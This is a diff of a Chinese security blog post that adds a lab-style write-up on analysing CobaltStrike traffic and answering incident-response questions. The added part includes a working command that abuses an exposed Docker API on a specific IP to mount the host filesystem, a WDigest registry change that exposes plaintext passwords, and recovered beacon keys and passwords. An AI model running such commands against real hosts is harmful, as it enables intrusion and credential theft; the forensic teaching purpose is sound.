@@ -83,7 +83,7 @@
 <meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-19111343.png">
 <meta property="og:image" content="https://0ran9ewww.github.io/images/%E7%8E%84%E6%9C%BA/2025-03-19110113.png">
 <meta property="article:published_time" content="2025-03-02T13:00:00.000Z">
-<meta property="article:modified_time" content="2025-08-01T01:46:14.010Z">
+<meta property="article:modified_time" content="2025-08-06T08:34:45.453Z">
 <meta property="article:author" content="orange">
 <meta property="article:tag" content="应急响应">
 <meta name="twitter:card" content="summary_large_image">
@@ -325,7 +325,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          20k 字
+          21k 字
         
       </span>
     
@@ -336,7 +336,7 @@
         
         
         
-          169 分钟
+          175 分钟
         
       </span>
     
@@ -386,7 +386,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年8月1日 上午
+                    本文最后更新于 2025年8月6日 下午
                   
                 
               </p>
@@ -1164,6 +1164,55 @@
 <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">_BYTE *<span class="hljs-keyword">sub_405EC9()</span><br><span class="hljs-keyword"></span>&#123;<br>  _BYTE *result<span class="hljs-comment">; // rax</span><br>  _BYTE *<span class="hljs-built_in">v1</span><span class="hljs-comment">; // rsi</span><br>  __int64 i<span class="hljs-comment">; // rdx</span><br><br>  result = (_BYTE *)<span class="hljs-keyword">sub_42C200(24LL);</span><br><span class="hljs-keyword"></span>  <span class="hljs-built_in">v1</span> = off_6EB168;<br>  for ( i = <span class="hljs-number">0</span>LL<span class="hljs-comment">; i != 23; ++i )</span><br>    result[i] = <span class="hljs-built_in">v1</span>[i] ^ <span class="hljs-number">0x69</span>;<br>  off_6EB168 = result;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure>
 <p>提取一下unk_4BEFFD的信息</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">unk_4BEFFD = [<span class="hljs-number">0x3D</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x0E</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> unk_4BEFFD:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i^<span class="hljs-number">0x69</span>), end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure>
+<h1 id="cobaltstrike流量分析"><a class="markdownIt-Anchor" href="#cobaltstrike流量分析"></a> CobaltStrike流量分析</h1>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[2025-08-06 14:50:47]</span> <span class="hljs-selector-attr">[SUCCESS]</span> 端口开放 <span class="hljs-number">69.230</span>.<span class="hljs-number">239.206</span>:<span class="hljs-number">2375</span><br><span class="hljs-selector-attr">[2025-08-06 14:50:52]</span> <span class="hljs-selector-attr">[SUCCESS]</span> 服务识别 <span class="hljs-number">69.230</span>.<span class="hljs-number">239.206</span>:<span class="hljs-number">2375</span> =&gt; <span class="hljs-selector-attr">[http]</span><br><span class="hljs-selector-attr">[2025-08-06 14:50:56]</span> <span class="hljs-selector-attr">[INFO]</span> 存活端口数量: <span class="hljs-number">1</span><br><span class="hljs-selector-attr">[2025-08-06 14:50:56]</span> <span class="hljs-selector-attr">[INFO]</span> 开始漏洞扫描<br><span class="hljs-selector-attr">[2025-08-06 14:50:56]</span> <span class="hljs-selector-attr">[INFO]</span> 加载的插件: webpoc, webtitle<br><span class="hljs-selector-attr">[2025-08-06 14:50:56]</span> <span class="hljs-selector-attr">[SUCCESS]</span> 网站标题 http:<span class="hljs-comment">//69.230.239.206:2375 状态码:404 长度:29     标题:无标题</span><br><span class="hljs-selector-attr">[2025-08-06 14:50:57]</span> <span class="hljs-selector-attr">[SUCCESS]</span> 目标: http:<span class="hljs-comment">//69.230.239.206:2375</span><br>  漏洞名称: poc-yaml-docker-api-unauthorized-rce<br>  详细信息: author:<span class="hljs-built_in">j4ckzh0u</span>(https:<span class="hljs-comment">//github.com/j4ckzh0u)</span><br>            links:https:<span class="hljs-comment">//github.com/vulhub/vulhub/tree/master/docker/unauthorized-rce</span><br><span class="hljs-selector-attr">[2025-08-06 14:50:57]</span> <span class="hljs-selector-attr">[SUCCESS]</span> 目标: http:<span class="hljs-comment">//69.230.239.206:2375</span><br>  漏洞名称: poc-yaml-go-pprof-leak<br>  详细信息: author:<span class="hljs-built_in">pa55w0rd</span>(www<span class="hljs-selector-class">.pa55w0rd</span>.online/)<br>            links:https:<span class="hljs-comment">//cloud.tencent.com/developer/news/312276</span><br><span class="hljs-selector-attr">[2025-08-06 14:51:05]</span> <span class="hljs-selector-attr">[SUCCESS]</span> 扫描已完成: <span class="hljs-number">2</span>/<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@dkcjbRCmYFsaLJs:~# docker -H tcp://<span class="hljs-number">69.230.239.206:2375</span> images<br><span class="hljs-attribute">REPOSITORY</span>   TAG       IMAGE ID       CREATED        SIZE<br><span class="hljs-attribute">nginx</span>        latest    <span class="hljs-number">97662</span>d24417b   <span class="hljs-number">6</span> months ago   <span class="hljs-number">192</span>MB<br></code></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker  -H tcp:<span class="hljs-regexp">//</span><span class="hljs-number">161.189</span>.<span class="hljs-number">96.3</span>:<span class="hljs-number">2375</span> run -it   -v <span class="hljs-regexp">/:/m</span>nt nginx  <span class="hljs-regexp">/bin/</span>bash<br><br></code></pre></td></tr></table></figure>
+<h2 id="q1-25"><a class="markdownIt-Anchor" href="#q1-25"></a> Q1</h2>
+<p>1.溯源反制，提交黑客CS服务器的flag.txt内容</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@e622d6a17c7f</span><span class="hljs-symbol">:/mnt</span><span class="hljs-comment"># cd root</span><br>root<span class="hljs-variable">@e622d6a17c7f</span><span class="hljs-symbol">:/mnt/root</span><span class="hljs-comment"># ls</span><br>flag.txt<br>root<span class="hljs-variable">@e622d6a17c7f</span><span class="hljs-symbol">:/mnt/root</span><span class="hljs-comment"># cat flag.txt</span><br>flag&#123;<span class="hljs-number">6750</span>ac374fdc3038a67e95e1f21d455c&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="q2-25"><a class="markdownIt-Anchor" href="#q2-25"></a> Q2</h2>
+<p>2.黑客攻击主机上线时间是？(flag{YYYY-MM-DD HH:MM:SS})</p>
+<p>看流量包</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Date</span>: Wed, <span class="hljs-number">12</span> Feb <span class="hljs-number">2025</span> <span class="hljs-number">12</span>:<span class="hljs-number">12</span>:<span class="hljs-number">52</span> GMT<br><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">2025</span>-<span class="hljs-number">02</span>-<span class="hljs-number">12</span> <span class="hljs-number">20</span>:<span class="hljs-number">12</span>:<span class="hljs-number">52</span>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="q3-25"><a class="markdownIt-Anchor" href="#q3-25"></a> Q3</h2>
+<p>3.黑客使用的隧道payload名字是什么？</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\Users\<span class="hljs-number">0</span>raN9e\Desktop\script\Misc\CS流量\CSthing\<span class="hljs-number">1768</span>_v0_0_8&gt;python <span class="hljs-number">1768</span>.py FJwV<br><span class="hljs-attribute">File</span>: FJwV<br><span class="hljs-attribute">xorkey</span>(chain): <span class="hljs-number">0</span>x1f6828ff<br><span class="hljs-attribute">length</span>: <span class="hljs-number">0</span>x040e00ad<br><span class="hljs-attribute">Config</span> found: xorkey b&#x27;.&#x27; <span class="hljs-number">0</span>x00000000 <span class="hljs-number">0</span>x000057cf<br><span class="hljs-attribute">0x0001</span> payload type                     <span class="hljs-number">0</span>x0001 <span class="hljs-number">0</span>x0002 <span class="hljs-number">0</span> windows-beacon_http-reverse_http<br></code></pre></td></tr></table></figure>
+<p><code>flag&#123;windows-beacon_http-reverse_http&#125;</code></p>
+<h2 id="q4-22"><a class="markdownIt-Anchor" href="#q4-22"></a> Q4</h2>
+<p>4.黑客获取到当前用户的明文密码是什么？</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@e622d6a17c7f</span><span class="hljs-symbol">:/mnt</span><span class="hljs-comment"># find  .  -name .cobaltstrike.beacon_keys</span><br>./opt/<span class="hljs-title class_">Cobalt_Strike_4</span>.<span class="hljs-number">5</span>/<span class="hljs-title class_">Cobalt_Strike_4</span>.<span class="hljs-number">5</span>/.cobaltstrike.beacon_keys<br></code></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python parse_beacon_keys<span class="hljs-selector-class">.py</span> <span class="hljs-selector-class">.cobaltstrike</span>.beacon_keys<br></code></pre></td></tr></table></figure>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">Raw <span class="hljs-built_in">Key</span> (hex): a4553adf7a841e1dcf708afc912275ee<br>AES <span class="hljs-built_in">key</span>: a368237121ef51b094068a2e92304d46<br>HMAC <span class="hljs-built_in">key</span>: b6315feb217bd87188d06870dd92855b<br></code></pre></td></tr></table></figure>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> <span class="hljs-keyword">cs</span>-parse-http-traffic.<span class="hljs-keyword">py</span> -r a4553adf7a841e1dcf708afc912275ee cs_res.pcapng<br></code></pre></td></tr></table></figure>
+<p>不好整，直接翻日志可以找到密码的</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-symbol">xj@</span>cs123<br></code></pre></td></tr></table></figure>
+<h2 id="q5-18"><a class="markdownIt-Anchor" href="#q5-18"></a> Q5</h2>
+<p>5.黑客为了得到明文密码修改了什么？（提交flag{md5(执行的命令)}）</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">flag&#123;md5( /C reg <span class="hljs-keyword">add</span><span class="language-bash"> HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f)&#125;</span><br>flag&#123;<span class="hljs-number">73</span>aeb8ee98d124a1f8e87f7965dc0b4a&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="q6-9"><a class="markdownIt-Anchor" href="#q6-9"></a> Q6</h2>
+<p>6.黑客下载的文件名称是什么？</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">raw_path = b<span class="hljs-string">&#x27;C:\\Users\\Administrator\\Desktop\\xxx\xb7\xfe\xce\xf1\xc6\xf7\xd4\xcb\xce\xac\xd0\xc5\xcf\xa2.xls&#x27;</span><br>decoded_path = raw_path<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;gbk&#x27;</span>)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(decoded_path)</span></span><br><br><span class="hljs-selector-id">#C</span>:\Users\Administrator\Desktop\xxx服务器运维信息<span class="hljs-selector-class">.xls</span><br><br></code></pre></td></tr></table></figure>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;xxx服务器运维信息.xlsx&#125;</span><br></code></pre></td></tr></table></figure>
+<h2 id="q7-7"><a class="markdownIt-Anchor" href="#q7-7"></a> Q7</h2>
+<p>7.黑客下载的文件内容是什么？</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">find</span> . -<span class="hljs-built_in">type</span> <span class="hljs-keyword">f</span> -name <span class="hljs-string">&#x27;.xlsx&#x27;</span><br><span class="hljs-keyword">grep</span> -r <span class="hljs-string">&quot;download&quot;</span> ./logs |<span class="hljs-keyword">grep</span> -v <span class="hljs-string">&quot;unknown&quot;</span><br></code></pre></td></tr></table></figure>
+<p>打开里面就有flag</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">752</span>fe2f44306e782f0d6830faad59e0e&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="q8-5"><a class="markdownIt-Anchor" href="#q8-5"></a> Q8</h2>
+<p>8.黑客上传的文件内容是什么？</p>
+<p>图片里面有内容</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;hacker&#125;</span><br></code></pre></td></tr></table></figure>
+<h2 id="q9-4"><a class="markdownIt-Anchor" href="#q9-4"></a> Q9</h2>
+<p>9.黑客截图后获取到用户正在使用哪个软件？（提交程序名称如firefox）</p>
+<p>读取第65334号提取出来的文件，改为png格式后，发现为chrome浏览器。</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;chrome&#125;</span><br></code></pre></td></tr></table></figure>
+<h2 id="q10-4"><a class="markdownIt-Anchor" href="#q10-4"></a> Q10</h2>
+<p>10.黑客读取到浏览器保存的密码是什么？</p>
+<p>在第 123336包里读取到密码<code>0f338a1a6ad8785cee2b471d9d3e9f91</code></p>
+<h2 id="q11-3"><a class="markdownIt-Anchor" href="#q11-3"></a> Q11</h2>
+<p>11.黑客使用键盘记录获取到用户打开了什么网站？（提交网站域名）</p>
+<p>在第127593包里，我们可以看到<code>xj.edisec.net</code>推测访问了这个网址。</p>
 
                 
               </div>
@@ -1228,7 +1277,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2025年8月1日</div>
+          <div>2025年8月6日</div>
         </div>
       
       
